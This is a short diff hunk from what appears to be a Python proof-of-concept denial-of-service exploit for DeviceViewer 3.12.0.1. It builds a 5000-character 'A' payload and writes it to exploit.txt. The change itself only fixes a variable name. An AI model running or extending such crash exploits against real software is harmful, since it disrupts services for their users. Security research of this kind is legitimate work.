@@ -19,7 +19,7 @@
 payload = "A" * 5000
 
 try:
-    evilCreat =open("exploit.txt","w")
+    evilCreate =open("exploit.txt","w")
     print("""
     DeviceViewer 3.12.0.1 DOS exploit POC
     Author: Nu11pwn
